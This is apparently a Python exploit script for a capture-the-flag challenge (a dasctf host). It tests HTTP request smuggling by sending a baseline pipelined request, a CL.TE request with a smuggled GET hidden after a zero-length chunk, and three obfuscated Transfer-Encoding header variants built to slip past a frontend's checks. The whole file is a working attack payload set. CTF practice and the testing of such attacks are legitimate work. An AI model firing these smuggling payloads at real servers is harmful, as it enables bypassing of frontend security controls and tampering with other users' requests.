#!/usr/bin/env python3
import re
import socket
import time
from pathlib import Path

HOST = "2273095efcf1270253338a5c.http-ctf2.dasctf.com"
PORT = 80


def request(name: str, payload: bytes) -> None:
    data = bytearray()
    with socket.create_connection((HOST, PORT), timeout=8) as sock:
        sock.settimeout(2)
        sock.sendall(payload)
        while True:
            try:
                chunk = sock.recv(65535)
            except socket.timeout:
                break
            if not chunk:
                break
            data.extend(chunk)
    out = Path(f"/tmp/clte_{name}.response")
    out.write_bytes(data)
    statuses = re.findall(rb"HTTP/1\.[01] [^\r\n]+", data)
    print(name, "bytes=", len(data), "statuses=", [x.decode("latin1") for x in statuses])


host = f"Host: {HOST}\r\n".encode()
follow = b"GET /health HTTP/1.1\r\n" + host + b"Connection: close\r\n\r\n"

# Baseline: two ordinary requests on one connection.
request(
    "pipeline",
    b"GET / HTTP/1.1\r\n" + host + b"Connection: keep-alive\r\n\r\n" + follow,
)

# CL.TE: if the backend honors TE, it sees a zero chunk and may parse the bytes
# after it as a second request while the frontend accounts for them as body.
smuggled = b"GET /health HTTP/1.1\r\n" + host + b"X-Pad: x\r\n\r\n"
body = b"0\r\n\r\n" + smuggled
request(
    "clte",
    b"POST / HTTP/1.1\r\n"
    + host
    + f"Content-Length: {len(body)}\r\n".encode()
    + b"Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n"
    + body
    + follow,
)

# Obfuscated TE variants sometimes pass a frontend's header check but remain
# acceptable to a backend.
for label, te in (
    ("clte_space", b"Transfer-Encoding : chunked\r\n"),
    ("clte_tab", b"Transfer-Encoding:\tchunked\r\n"),
    ("clte_identity", b"Transfer-Encoding: identity, chunked\r\n"),
):
    request(
        label,
        b"POST / HTTP/1.1\r\n"
        + host
        + f"Content-Length: {len(body)}\r\n".encode()
        + te
        + b"Connection: keep-alive\r\n\r\n"
        + body
        + follow,
    )
